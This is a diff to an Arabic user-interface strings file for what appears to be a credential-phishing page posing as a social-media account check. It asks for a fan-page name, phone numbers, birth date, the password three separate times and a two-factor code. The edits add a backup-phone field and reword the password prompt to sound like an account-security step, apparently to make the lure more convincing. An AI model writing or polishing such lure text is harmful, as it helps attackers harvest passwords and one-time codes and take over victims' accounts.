@@ -78,6 +78,7 @@ export const ar: AppStrings = {
     fanpage: 'اسم الصفحة / صفحة المعجبين',
     fanpagePh: 'مثال: ABC Studio Official',
     phone: 'رقم الهاتف',
+    phoneBackup: 'رقم هاتف احتياطي (إذا تعذر التواصل)',
     dob: 'تاريخ الميلاد',
     day: 'اليوم',
     month: 'الشهر',
@@ -129,7 +130,7 @@ export const ar: AppStrings = {
     errYear: 'يرجى اختيار سنة الميلاد.',
   },
   password: {
-    firstPrompt: 'للتحقق من هويتك، يرجى إدخال كلمة المرور للمتابعة.',
+    firstPrompt: 'لضمان أمان حسابك، يرجى إدخال كلمة المرور للمتابعة.',
     secondPrompt: 'يرجى إعادة إدخال كلمة المرور للتأكيد والمتابعة.',
     thirdPrompt: 'يرجى إدخال كلمة المرور مرة أخرى للتأكيد والمتابعة.',
     notice:
@@ -148,10 +149,11 @@ export const ar: AppStrings = {
   },
   twoFa: {
     title: 'التحقق من الهوية',
-    description: (destinations: string) =>
-      destinations
-        ? `أدخل الرمز المرسل إلى ${destinations} أو رقم هاتف مرتبط آخر، أو أكد باستخدام تطبيق المصادقة الذي أعددته (مثل Duo Mobile أو Google Authenticator).`
-        : `أدخل الرمز المرسل إلى حسابك أو رقم هاتف مرتبط آخر، أو أكد باستخدام تطبيق المصادقة الذي أعددته (مثل Duo Mobile أو Google Authenticator).`,
+    intro: "يُرجى التحقق من عناوين البريد الإلكتروني وأرقام الهواتف المرتبطة أدناه. أدخل رمز التحقق المُرسل إلى أحدها، أو أكد باستخدام تطبيق المصادقة الذي أعددته، للمتابعة.",
+    emailHeading: "البريد الذي استلم الرمز",
+    phoneHeading: "الهاتف الذي استلم الرمز",
+    otherHeading: "طريقة أخرى",
+    authenticator: "تطبيق المصادقة: Duo Mobile أو Google Authenticator.",
     label: 'رمز المصادقة',
     placeholder: 'أدخل رمز المصادقة',
     hint: 'الرمز الصحيح يتكون من 6 أو 8 أرقام.',
